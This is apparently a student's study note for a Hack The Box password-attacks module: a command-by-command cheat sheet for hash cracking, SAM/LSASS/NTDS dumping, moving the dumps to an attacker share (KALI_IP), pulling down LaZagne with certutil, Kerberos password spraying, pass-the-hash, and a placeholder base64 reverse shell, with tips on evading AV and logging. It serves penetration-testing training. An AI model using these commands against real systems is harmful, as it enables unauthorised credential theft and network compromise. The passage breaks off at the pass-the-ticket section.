# Password Attacks (HTB Supplementary)

#PasswordAttacks #JohnTheRipper #Hashcat #BitLocker #officetojohn #bitlockertojohn #MaskAttack #CustomWordlist #SAMDump #LSASSDump #pypykatz #CredentialManager #cmdkey #LaZagne #findstr #NTDS #VSS #usernameAnarchy #kerbrute #FirefoxDecrypt #Wireshark #Snaffler #PassTheHash #xfreerdp #InvokeTheHash #PassTheTicket #ccache #keytab #kinit #PassTheCertificate #pywhisker #PKINITtools #ADCS #NTLMRelay #HTBSupplementary

**HTB Password Attacks module** — supplementary to Offsec Module 16. The Offsec module covers Hydra (SSH/RDP/HTTP), Hashcat (dictionary + rules), John basics (ssh2john/keepass2john), NTLM cracking (SAM + Mimikatz), Pass-the-Hash (impacket), Net-NTLMv2 (Responder + relay), and Credential Guard. Everything in this note is not covered there.

> 🔁 Cross-refs: [[Password Attacks]] (Module 16 — Hydra, Hashcat, Mimikatz, Responder, relay), [[Using the Metasploit Framework (HTB Supplementary)#MSF.4. Post-Exploitation: NTLM Hash Dumping|MSF.4 post/windows/gather/hashdump]], [[Port Redirection and SSH Tunneling]] (ligolo-ng pivot concepts), [[Footprinting (HTB Supplementary)#FP.1|FP.1 FTP, FP.2 SMB]] (credential context), [[Active Directory Introduction and Enumeration]] (domain attacks context)

---

## PA.1. Hash Computation Quick Reference

```bash
# SHA1 of a string (no trailing newline)
echo -n "Academy#2025" | sha1sum
# → 750fe4b402dc9f91cedf09b652543cd85406be8c  -

# MD5
echo -n "string" | md5sum

# SHA256
echo -n "string" | sha256sum
```

The `-n` flag to `echo` is critical — without it a newline is appended and the hash changes.

#### Tags: #sha1sum #md5sum #HashComputation

---

## PA.2. John the Ripper — Deep Dive

The Offsec module uses `ssh2john` and `keepass2john`. These are the additional John capabilities from the HTB module:

### PA.2.1. Single-Crack Mode (username mangling)

Single-crack mode generates candidate passwords by mangling the username field in the hash file. It tries variations like `NAITSABES` (reversed `sebastian`), capitalised, leetspeak substitutions, etc.

```bash
# Hash file must contain the full /etc/shadow-style line including username
echo -n 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > hash.txt

john --single hash.txt
# Uses username "r0lf" + GECOS field "Rolf Sebastian" as base for mutations
```

> 🔍 Worth remembering generally: single-crack mode works especially well when the password is a variation of the account name. It's fast (tries thousands of permutations in seconds) and should always be the first John attempt before wordlist mode.

### PA.2.2. Wordlist Mode with Specific Format

```bash
# Specify the hash format explicitly when John can't auto-detect
john --format=ripemd-128 --wordlist=./rockyou.txt hash.txt

# Show previously cracked passwords from the john.pot cache
john --show hash.txt

# Common format strings: sha512crypt (Linux $6$), md5crypt (Linux $1$), 
# NT (Windows), lm, descrypt, ripemd-128, ripemd-160, sha1, sha256, sha512
```

### PA.2.3. unshadow — Combine passwd and shadow

Linux stores usernames in `/etc/passwd` and password hashes in `/etc/shadow`. John needs them merged to associate username with hash (for single-crack mode):

```bash
unshadow passwd shadow > combined.txt

# Then crack the combined file
john --single combined.txt              # single-crack first
john --wordlist=./rockyou.txt combined.txt   # then wordlist
```

> 🔧 Technique: only crack specific users instead of the whole file by extracting their line. For user `martin`: `grep "^martin:" combined.txt > martin_hash.txt`, then crack `martin_hash.txt`.

### PA.2.4. office2john — Crack Office Document Passwords

```bash
# Extract hash from password-protected Office document
office2john Confidential.xlsx > hash.txt

# Check what was extracted
cat hash.txt
# → Confidential.xlsx:$office$*2013*100000*256*16*...*...*...

# Crack with John
john --wordlist=./rockyou.txt hash.txt

# Reveal the cracked password
john --show hash.txt
```

Works for: `.xlsx`, `.docx`, `.pptx` (Office 2007+), `.xls`, `.doc` (older formats). The `$office$*2013*` prefix indicates Office 2013 encryption.

### PA.2.5. bitlocker2john — Crack BitLocker VHD/Volume Passwords

```bash
# Extract hashes from a BitLocker-encrypted VHD
bitlocker2john -i Private.vhd > backup.hashes

# The output contains two hash types:
# bitlocker$0 = user password hash (this is what you want to crack)
# bitlocker$1 = recovery password hash (48-digit numeric — impractical to crack)

# Filter to only the user password hash
grep "bitlocker\$0" backup.hashes > backup.hash

# Crack with John
john --wordlist=./rockyou.txt backup.hash
```

> 🔧 Technique: John's BitLocker support is slow (1 million iterations). Expect minutes per candidate on CPU. For faster cracking use hashcat: `-m 22100` is BitLocker AES-CBC 128-bit / AES-CBC 256-bit. `-m 22200` is older BitLocker.

#### Tags: #JohnTheRipper #SingleCrack #unshadow #office2john #bitlocker2john #ripemd128 #SHA512crypt

---

## PA.3. Hashcat — Additional Modes

The Offsec module covers `-a 0` (dictionary) and `-a 0 -r rule` (rule-based). New here:

### PA.3.1. Mask Attack (-a 3)

A mask attack is a structured brute force where you define the character set per position. Faster than pure brute force when you know the password pattern.

**Character class tokens:**

| Token | Character set |
|-------|--------------|
| `?l` | lowercase letters (a-z) |
| `?u` | uppercase letters (A-Z) |
| `?d` | digits (0-9) |
| `?s` | special characters (!@#$%...) |
| `?a` | all printable characters |
| `?h` | hex lowercase (0-9a-f) |

```bash
# Mask: uppercase + 4 lowercase + digit + symbol = 7 chars
# Pattern matches something like: Mouse5!
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

# Show result after cracking
hashcat -m 0 1e293d6912d074c0fd15844d803400dd --show
```

> 🔍 Worth remembering generally: mask attacks are the right tool when the target's password policy is known (e.g. "must be 8 chars: 1 upper, 1 number, 1 symbol"). The mask encodes the policy directly as a pattern. They're faster than rules-based dictionary attacks for well-defined patterns.

### PA.3.2. Custom Wordlist Generation + Mutation

When you have OSINT about a target person (name, employer, hobby, birth year), build a person-specific wordlist and mutate it:

```bash
# Write the base wordlist from OSINT
cat << EOF > password.list
Mark
White
August
1998
Nexura
Baseball
Bella
EOF

# Write a custom hashcat rule set
cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF

# Common rule syntax:
# c = Capitalize first char, lowercase rest
# C = Lowercase first char, uppercase rest
# t = Toggle ALL chars
# $X = Append character X
# $1$9$9$8 = Append "1998" (each $X appends one char)
# sXY = Replace all X with Y (sa@ = replace a with @)

# Generate the mutated wordlist (--stdout outputs candidates, not cracking)
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Preview what was generated
wc -l mut_password.list     # check count
head -20 mut_password.list  # preview first 20

# Crack with the mutated wordlist
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
```

> 🔍 Worth remembering generally: OSINT-informed wordlists dramatically outperform rockyou.txt when the target has set a password related to their personal details. Company name + year + symbol is a very common pattern.

### PA.3.3. Password Safe v3 (psafe3)

```bash
# Find hashcat mode for Password Safe
hashcat --example-hashes | grep -i safe -A 5
# → Name: Password Safe v3 ... (mode 5200)

# Crack the Password Safe vault
hashcat -m 5200 vault.psafe3 /usr/share/wordlists/rockyou.txt
```

Once the master password is cracked, open the `.psafe3` vault with Password Safe 3 (Windows) or `pwsafe` (Linux) to access stored credentials.

### PA.3.4. Other Useful Hashcat Patterns

```bash
# Show all cracked hashes from the potfile (no need to rerun)
hashcat -m 1000 hashfile --show

# Find hashcat mode for any format by grepping example hashes
hashcat --example-hashes | grep -i "bitlocker" -A 5
hashcat --example-hashes | grep -i "keepass" -A 5
hashcat --example-hashes | grep -i "office" -A 5

# Dictionary + rules against NTLM hashes (combining what Offsec teaches)
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Tags: #Hashcat #MaskAttack #CustomWordlist #CustomRules #PasswordSafe #psafe3 #--stdout

---

## PA.4. BitLocker VHD: Full Crack + Mount Chain

When you find a BitLocker-encrypted VHD file (e.g. from a download or SMB share):

```bash
# Step 1: crack the password with bitlocker2john + john (see PA.2.5)
bitlocker2john -i Private.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
john --wordlist=./rockyou.txt backup.hash
# → francisco

# Step 2: set up the loop device
sudo losetup -f -P Private.vhd   # -f = find next free loop, -P = partition scan
losetup --all                      # verify: /dev/loop0: []: (/path/Private.vhd)
# Note the loop device name (e.g. /dev/loop0)

# Step 3: install dislocker if needed
sudo apt-get install dislocker -y

# Step 4: decrypt via dislocker
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
sudo dislocker /dev/loop0p1 -ufrancisco -- /media/bitlocker
# -u = user password flag (lowercase u followed by the password with no space)
# The partition suffix 'p1' is because losetup -P created partition devices

# Step 5: verify dislocker-file was created
sudo ls -la /media/bitlocker
# → dislocker-file (this is the decrypted virtual disk image)

# Step 6: mount the decrypted image
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# Step 7: read files
cd /media/bitlockermount
cat flag.txt
```

> 🔧 Technique: the partition suffix on the loop device (`/dev/loop0p1`) is required when BitLocker protects a partition rather than the whole disk. If `dislocker` errors, try `/dev/loop0` (no partition suffix) for VHDs that are whole-disk encrypted.

> 🔧 Technique: the `dislocker -u` password flag takes the password immediately after `-u` with NO space or equals sign: `-ufrancisco` not `-u francisco`.

#### Tags: #BitLocker #dislocker #losetup #VHD #BitlockerMount #loopDevice

---

## PA.5. MSF smb_login — SMB Brute Force

When Hydra isn't working against SMB, or you want to avoid the credential format quirks, the MSF auxiliary module handles SMB auth natively:

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login

set USER_FILE username.list     # username wordlist
set PASS_FILE password.list     # password wordlist
set RHOST TARGET_IP
set VERBOSE false               # suppress failed attempts, show only successes
run
# Output: [+] TARGET:445 - Success: '.\john:november'
```

> 🔍 Worth remembering generally: `smb_login` reports all valid credential pairs, including users that authenticate but are NOT administrators. This can be useful for finding low-privilege accounts that you couldn't reach with NetExec `(Pwn3d!)` filtering. After finding valid creds, use `smbclient -U user -L '\\TARGET\'` to enumerate their shares.

```bash
# Connect to a specific share with found credentials
smbclient -U cassie '\\TARGET_IP\CASSIE'
# Within smbclient session:
smb: \> dir
smb: \> get flag.txt
smb: \> exit

cat flag.txt
```

#### Tags: #SMB #smb_login #Metasploit #auxiliary #smbclient

---

## PA.6. Default Credentials Tool

```bash
# Install the Python-based default credentials reference tool
pip3 install defaultcreds-cheat-sheet

# Search for default credentials for a specific product
creds search mysql
# → shows: superdba:admin, root:root, root:<blank>, etc.

creds search tomcat
creds search cisco
creds search fortinet
```

Use these as candidates before brute-forcing. `superdba:admin` is a genuine MySQL default that works on unmodified installs.

> 🔁 Similar to: [[Footprinting (HTB Supplementary)#FP.10. IPMI|FP.10 IPMI]] vendor default creds table. Same principle — check known defaults before brute force.

#### Tags: #DefaultCredentials #defaultcreds-cheat-sheet #mysql #CredentialHunting

---

## PA.7. SAM Offline Dump — reg.exe + secretsdump LOCAL

The Offsec module covers Mimikatz against live LSASS. This is the offline SAM dump via registry export, which works without Mimikatz and without needing a Meterpreter session:

**On the target (Windows, as Administrator):**
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

**On Kali — set up receiving SMB share:**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents
# Or: impacket-smbserver -smb2support CompData /home/kali/Documents
```

**On target — move files to Kali's SMB share:**
```cmd
move C:\sam.save \\KALI_IP\CompData
move C:\system.save \\KALI_IP\CompData
move C:\security.save \\KALI_IP\CompData
```

**On Kali — dump all hashes offline:**
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
# Output format: username:RID:LM_hash:NT_hash:::
# Also dumps: DPAPI keys, LSA secrets, cached domain logon hashes

# Extract only NT hashes for cracking
cut -d ':' -f 4 samhashes.txt > nthashes.txt
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt.gz
```

> 🔍 Worth remembering generally: the `_SC_gupdate` (or similar `_SC_` prefix) entries in secretsdump LSA secrets output are plaintext credentials for service accounts running as domain users. These are cleartext in the LSA secrets store and appear as `(Unknown User):Password123` in the output. Always check `_SC_` entries.

> 🔁 Similar to: [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]] uses Mimikatz against live LSASS. This method works when Mimikatz is blocked by AV or EDR but reg.exe still runs.

#### Tags: #SAM #reg.exe #secretsdump #impacket #smbserver #OfflineDump #LSASecrets

---

## PA.8. LSASS Dump via Task Manager + pypykatz

An alternative to Mimikatz for LSASS dumping that uses only built-in Windows tools:

**On target (RDP session, run Task Manager as Administrator):**
1. Task Manager → Details tab → scroll to `lsass.exe`
2. Right-click → Create dump file
3. Note the path: `C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP`

**Exfil the dump via Impacket SMB share (same smbserver.py method as PA.7):**
```cmd
move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP \\KALI_IP\CompData
```

**Parse the dump with pypykatz on Kali:**
```bash
pypykatz lsa minidump ./lsass.DMP
```

pypykatz output structure per logon session:
```
== LogonSession ==
authentication_id 126654 (1eebe)
session_id 0
username Vendor
...
    == MSV ==
        * NTLM     : 31f87811133bc6aaa75a536e77f64314
        * SHA1     : 2b1c560c...
```

Take the NTLM hash and crack with hashcat `-m 1000` or use for PtH.

> 🔧 Technique: Task Manager `lsass.exe` dump requires an account in the Administrators group AND running Task Manager elevated. On some targets the `lsass.exe` process won't appear in Task Manager until you switch to the Details tab (not the Processes tab).

> 🔁 Similar to: [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]] uses Mimikatz `sekurlsa::logonpasswords` for the same result. Task Manager method evades some AV/EDR signatures that flag Mimikatz's LSASS read. `pypykatz` does the same parsing offline.

#### Tags: #LSASS #pypykatz #TaskManager #lsassDump #MemoryDump #NTLM

---

## PA.9. Remote Credential Dumping via NetExec

Faster than the manual SAM/LSASS dump chain when you have valid admin credentials and don't need RDP:

```bash
# Dump LSA secrets remotely (includes service account plaintext, NL$KM, DPAPI keys)
netexec smb TARGET_IP --local-auth -u bob -p 'Password123!' --lsa

# Dump NTDS.dit remotely (requires Domain Admin)
nxc smb DC_IP -u admin -p 'Password!' --ntds
# Or filter to one user's hash
nxc smb DC_IP -u stom -H NTLM_HASH --ntds --user Administrator

# Dump SAM (local accounts only)
nxc smb TARGET_IP --local-auth -u admin -p pass --sam
```

> 🔍 Worth remembering generally: `--ntds` on a DC is equivalent to `impacket-secretsdump -just-dc`. The `--user Administrator` filter saves time by only dumping that one account's hash — useful when you just need the DA hash.

> 🔁 Similar to: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 + 16.3.4]] uses Responder + ntlmrelayx. NetExec `--lsa`/`--ntds` requires credentials but gives cleartext secrets and all hashes without relying on capturing NTLM challenges.

#### Tags: #NetExec #nxc #remoteDump #NTDS #LSA #SAM #CredentialDump

---

## PA.10. Windows Credential Manager

Windows stores credentials entered at authentication prompts in the Credential Manager. These persist across logins and can be impersonated without knowing the cleartext password.

**Enumerate stored credentials:**
```cmd
cmdkey /list
# Output shows: Target (WindowsLive:..., Domain:interactive=SRV01\mcharles), Type, User
```

**Spawn a process using stored credentials (no password needed):**
```cmd
runas /savecred /user:SRV01\mcharles cmd
# /savecred = use credentials from Credential Manager instead of prompting
# A new CMD window opens running as mcharles
```

Within the new cmd window, run `whoami` to confirm the impersonation, then `cmdkey /list` again to see what credentials mcharles has stored.

**LaZagne — extract all software-stored passwords:**
```bash
# Download on Kali, serve, download on target
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
python3 -m http.server 8000
```

```cmd
# On target — download via certutil
certutil -urlcache -split -f "http://KALI_IP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe

# Run and dump everything
C:\Windows\Temp\lazagne.exe all
```

LaZagne extracts from: WinSCP, Filezilla, browsers (Chrome, Firefox, IE), Outlook, Windows Credential Manager (Credman), VNC, Putty, and more. Output format:
```
########## User: mcharles ##########
------------------- Credman passwords -----------------
[+] Password found !!!
URL: onedrive.live.com
Login: mcharles@inlanefreight.local
Password: Inlanefreight#2025
```

> 🔍 Worth remembering generally: `cmdkey /list` and `runas /savecred` are built-in Windows binaries. No tools to transfer, no AV detection risk. If a user has stored domain credentials for another user account, you can impersonate that account instantly. Check this early in Windows post-exploitation before reaching for Mimikatz.

> 🔁 Similar to: [[Windows Privilege Escalation#17.1.3|17.1.3 PSReadline/transcript credential hunting]] and [[Common Web Application Attacks]] credential theft. LaZagne is the automated equivalent of manually checking browser saved passwords.

#### Tags: #CredentialManager #cmdkey #RunAs #savecred #LaZagne #WinSCP #Credman

---

## PA.11. Credential Hunting in Windows Files

**findstr for credential searching:**
```cmd
# Search all text-like files recursively for a keyword (case-insensitive, /SIM = recursive + case-insensitive + substring)
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Targeted keyword searches:
findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
findstr /SIM /C:"smtp" *.config *.xml *.ini

# Flags breakdown:
# /S = recursive (search subdirectories)
# /I = case-insensitive
# /M = print only filenames (not matching lines)
# /C:"text" = treat as literal string (vs space-separated OR words)
```

**PowerShell recursive content search across UNC shares:**
```powershell
# Search file contents on a network share
Get-ChildItem -Recurse -Include *.* \\DC01.domain.local\IT | Select-String -Pattern "DOMAIN\\"
# Shows: \\SERVER\SHARE\path\file.txt:5:# Auth: INLANEFREIGHT\jbader:Password123

# Find files by name pattern recursively (local)
Get-ChildItem -Path C:\ -Recurse -Filter "flag*" -ErrorAction SilentlyContinue
```

**Key file locations to check on Windows targets:**
```
C:\Users\*\AppData\Roaming\        # App data (browser profiles, config files)
C:\Users\*\Documents\              # User documents
C:\Windows\Panther\unattend.xml    # Unattended install files (often contain admin passwords)
C:\inetpub\wwwroot\web.config      # IIS web app config (DB connection strings)
C:\*.ini, *.conf, *.config         # Config files in C:\ root
C:\Automation*\                    # Admin scripts often left with embedded creds
```

> 🔍 Worth remembering generally: PowerShell scripts left in `C:\Automation` or `C:\Scripts` by sysadmins often contain hardcoded credentials for AD account provisioning, scheduled tasks, or backup jobs. `BulkaddADusers.ps1` is a real example. Always check non-standard folders at the root of C:\.

#### Tags: #findstr #GetChildItem #SelectString #CredentialHunting #PowerShell #WindowsCreds

---

## PA.12. NTDS.dit via VSS (Volume Shadow Copy)

Volume Shadow Copy Service (VSS) creates point-in-time snapshots of volumes. A Domain Admin can use this to copy locked files like NTDS.dit that Windows won't let you copy directly while in use:

**Inside a Domain Admin shell on the DC (WinRM/evil-winrm, RDP, or similar):**
```powershell
# Step 1: create a shadow copy of C:
vssadmin CREATE SHADOW /For=C:
# Output: Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Step 2: copy NTDS.dit from the shadow volume (bypasses file locking)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .\NTDS.dit

# Step 3: also copy SYSTEM (needed for decryption key)
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
```

**Exfil both files to Kali** (same smbserver.py method as PA.7):
```powershell
cmd.exe /c move .\NTDS.dit \\KALI_IP\NTDS
cmd.exe /c move .\SYSTEM \\KALI_IP\NTDS
```

**Dump all domain hashes offline:**
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# Output: domain\username:RID:LM_hash:NT_hash:::
# Includes: krbtgt, all domain users, machine accounts
```

**Crack a specific NT hash:**
```bash
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt.gz
```

> 🔍 Worth remembering generally: the `krbtgt` hash from the NTDS dump is what you need for a Golden Ticket attack (offline Kerberos TGT forgery). The `krbtgt` hash doesn't change unless someone runs `Reset-KrbtgtPassword` — so if you get it, it can persist as a backdoor. This is an AD-specific technique but important context for why NTDS dumps are so valuable.

> 🔁 Similar to: [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]] covers SAM dump (local accounts). VSS + NTDS covers all domain accounts on the DC.

#### Tags: #NTDS #VSS #vssadmin #ShadowCopy #secretsdump #DomainDump #krbtgt

---

## PA.13. Username Generation — username-anarchy

When you have a real person's name (from LinkedIn, social media, or an org chart) but not their username:

```bash
# Install
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy

# Generate common username formats for a full name
./username-anarchy John Marston > usernames.txt

# Output includes formats like: john, jmarston, j.marston, marston, johnm, etc.
cat usernames.txt
```

Use the output as `-L usernames.txt` with kerbrute or Hydra.

#### Tags: #usernameAnarchy #UsernameGeneration #OSINT #ADEnum

---

## PA.14. kerbrute — Kerberos Username Enumeration + Password Spray

kerbrute tests usernames and passwords against a Kerberos KDC without requiring SMB or LDAP. Kerberos errors (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED) distinguish valid from invalid usernames — no authentication needed.

```bash
# Download (or use: apt install kerbrute)
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x ./kerbrute

# First: get the domain name from the DC
netexec smb DC_IP
# Output: [*] Windows ... (name:DC01) (domain:ILF.local)

# Enumerate valid domain usernames
./kerbrute userenum -d ILF.local --dc DC_IP usernames.txt
# → [+] VALID USERNAME: jmarston@ILF.local

# Brute-force a single user's password
./kerbrute bruteuser -d ILF.local --dc DC_IP /usr/share/wordlists/fasttrack.txt jmarston
# → [+] VALID LOGIN: jmarston@ILF.local:P@ssword!
```

> 🔧 Technique: kerbrute's `userenum` does NOT generate authentication events in the Windows Security Event Log for invalid usernames — it's stealthier than LDAP-based enumeration. Valid usernames do generate a pre-auth request (event 4768) but failed usernames generate no log at all. This makes it useful for username discovery without triggering alerts.

> 🔧 Technique: `fasttrack.txt` is a short (250-entry) wordlist of commonly used corporate passwords (`P@ssword!`, `Password123`, `Welcome1`, `Summer2020`...). It's much faster than rockyou.txt for targeted AD user brute force where lockout policies might apply.

#### Tags: #kerbrute #Kerberos #KDC #UsernameEnum #ADEnum #PasswordSpray

---

## PA.15. Firefox Credential Extraction — firefox_decrypt

Firefox stores saved passwords encrypted in `~/.mozilla/firefox/<profile>/logins.json`. On Linux targets:

```bash
# Find Firefox profile directories
find / -name "logins.json" 2>/dev/null
# → /home/kira/.mozilla/firefox/ytb95ytb.default-release/logins.json

# Download firefox_decrypt on Kali, transfer to target
wget -q https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
python3 -m http.server 8000

# On target (SSH session)
wget KALI_IP:8000/firefox_decrypt.py

# Run from the parent of the Firefox profiles directory (not inside the profile)
cd /home/kira/.mozilla/firefox/
python3.9 firefox_decrypt.py     # some targets need specific python version
# Select profile number when prompted
```

Output:
```
Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

> 🔍 Worth remembering generally: Firefox profile names are random (e.g. `ytb95ytb.default-release`). The `default-release` suffix is the profile created by the current Firefox installer; `default` (no suffix) is older. If there are multiple profiles, try each one separately.

#### Tags: #Firefox #firefox_decrypt #BrowserCredentials #SavedPasswords #Linux

---

## PA.16. Credential Hunting in Network Traffic (Wireshark)

Three useful Wireshark filters for credential hunting in `.pcapng` captures:

```
# HTTP: look for cleartext POST data (forms, payments, logins)
Filter: http
→ Find POST requests → bottom-left expand "HTML Form URL Encoded"
→ Reveals: card_number, username, password fields in plaintext

# SNMP: community strings (in SNMPv2 these are cleartext)
Filter: snmp
→ Select any SNMP packet → expand "Simple Network Management Protocol"
→ Community field shows the community string (e.g. s3cr3tSNMPC0mmun1ty)

# FTP: credentials and file operations
Filter: ftp
→ Find "Request: PASS" packet → expand "File Transfer Protocol (FTP)" → plaintext password
→ Find "Request: RETR" packet → filename being downloaded
```

> 🔍 Worth remembering generally: SNMPv1 and SNMPv2c community strings are the SNMP equivalent of passwords. They're used for read (`public`) and read-write (`private`) access to network device MIBs. A non-default community string like `s3cr3tSNMPC0mmun1ty` typically gives read-write access to every network device configured with it. Worth escalating immediately.

> 🔁 Similar to: [[Footprinting (HTB Supplementary)]] covers SNMP enumeration from the attacker side. Wireshark shows what SNMP community strings are in use by watching the traffic.

#### Tags: #Wireshark #PCAP #NetworkTraffic #SNMP #FTP #Cleartext #CredentialHunting

---

## PA.17. Credential Hunting in Network Shares

### PA.17.1. Manual Share Browsing

```bash
# Enumerate shares a user can access
nxc smb TARGET_IP -u username -p 'password' --shares

# Connect and browse
smbclient -U DOMAIN\\username '\\TARGET_IP\SHARE'
smb: \> dir
smb: \> cd Confidential
smb: \> get Onboarding_Docs.txt
smb: \> exit
```

### PA.17.2. PowerShell Recursive Share Search

```powershell
# Search file contents across a share (run from Windows with access to the share)
Get-ChildItem -Recurse -Include *.* \\DC01.domain.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
# → \\SERVER\IT\Tools\split_tunnel.txt:5:# Auth: INLANEFREIGHT\jbader:ILovePower333###
```

### PA.17.3. NetExec Spider with Content Search

```bash
# Spider a specific share and search file CONTENTS for a pattern
nxc smb TARGET_IP -u user -p pass --spider HR --content --pattern "Administrator"
# → //TARGET/HR/Confidential/Onboarding_Docs_132.txt [offset:1167 pattern:'Administrator']

# Then fetch the matching file
smbclient //TARGET_IP/HR -U user
smb: \> cd Confidential
smb: \> get Onboarding_Docs_132.txt
```

### PA.17.4. Snaffler — Automated Interesting-File Finder

Snaffler recursively scans SMB shares for files that look like they contain credentials or sensitive info. It uses a ruleset to flag files by name pattern, extension, and content.

```cmd
# On Windows target with network access (download via RDP drive share or HTTP)
.\Snaffler.exe -u -s -n FILE01.nexura.htb

# Flags:
# -u = target-user only (use current user's credentials)
# -s = print results to stdout
# -n = target specific host (vs scanning the whole domain)
```

Snaffler output labels:
- `{Green}` = high confidence interesting file
- `{Black}` = password manager database
- `KeepNameContainsGreen|R|passw` = file name contains "passw", has Read access
- `KeepPassMgrsByExtension` = recognized password manager extension

> 🔍 Worth remembering generally: Snaffler is an alternative to manually running `findstr` and PowerShell across shares. It classifies files by a pre-built ruleset (credential patterns, extension types, file names). On large environments it's much faster than manual enumeration. Download from: `https://github.com/SnaffCon/Snaffler`

> 🔁 Similar to: [[Common Web Application Attacks]] credential hunting via `grep -r` on web roots. Same concept, applied to SMB shares.

#### Tags: #SMBShares #ShareHunting #Snaffler #nxcSpider #SelectString #CredentialHunting

---

## PA.18. Pass the Hash — Deep Dive

The Offsec module (16.3.2) covers `impacket-psexec` and `impacket-wmiexec`. New PtH methods:

### PA.18.1. PtH Command Execution via NetExec

```bash
# Execute a command as Administrator using NTLM hash (no password needed)
nxc smb TARGET_IP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'
# -d . = local account (domain dot means local context)
# -H = NTLM hash
# -x = command to execute
```

### PA.18.2. PtH over RDP — DisableRestrictedAdmin

By default, Restricted Admin Mode blocks RDP sessions authenticated only with a hash (no cleartext password). You must disable it first:

```bash
# Step 1: set the registry key via PtH command execution (works from Kali via nxc)
nxc smb TARGET_IP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 \
  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
# "The operation completed successfully." in output confirms it worked

# Step 2: connect via RDP using the hash (xfreerdp /pth: flag)
xfreerdp /v:TARGET_IP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

> 🔧 Technique: the registry key is `DisableRestrictedAdmin` with value `0` (zero = disable the restriction, i.e. allow hash-based RDP). Counterintuitively, setting it to 0 enables PtH RDP. Setting it to 1 re-enables Restricted Admin Mode and blocks hash-based RDP.

### PA.18.3. Mimikatz PtH — Spawn Process with Hash

While in a Windows session (RDP, cmd), spawn a new process that authenticates with a different user's hash:

```cmd
C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

A new `cmd.exe` window opens running in the security context of david (using the hash, not a password). You can now access resources as david:
```cmd
# In the new cmd window:
dir \\DC01\david
type \\DC01\david\david.txt
```

The `/rc4:` parameter takes the NTLM hash. The `/domain:` is the FQDN of the domain. `/run:` can be any executable.

### PA.18.4. Invoke-TheHash — PtH via WMI for Remote Code Execution

Invoke-TheHash is a PowerShell module for PtH-based remote execution. Useful for pivoting (executing on DC from MS01 when both are in the same network but DC can't be reached from Kali directly):

```powershell
# Import the module (already at C:\tools\Invoke-TheHash\ on lab target)
Import-Module C:\tools\Invoke-TheHash\Invoke-TheHash.psd1

# Execute a command on DC01 as julio using julio's hash
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio \
  -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "powershell -e <BASE64_REVERSE_SHELL>"
```

Where `<BASE64_REVERSE_SHELL>` is generated at RevShells.com → PowerShell Base64 → set LHOST to MS01's internal IP and LPORT to a free port. Start a `nc.exe -nlvp PORT` listener on MS01 before running.

> 🔍 Worth remembering generally: when pivoting through a jump host/MS01, the LHOST in reverse shells must be the internal IP of that pivot machine (not your external Kali IP). The DC can reach MS01 on the internal network, not your Kali directly.

#### Tags: #PassTheHash #PtH #xfreerdp #DisableRestrictedAdmin #mimikatz #InvokeTheHash #WMIExec #netexec

---

## PA.19. Pass the Ticket (PtT) from Windows

Kerberos TGTs can be exported from memory and imported into a different session to access resources as that user without their password.

### PA.19.1. Export All Tickets

```cmd
# Run as Administrator with SeDebugPrivilege
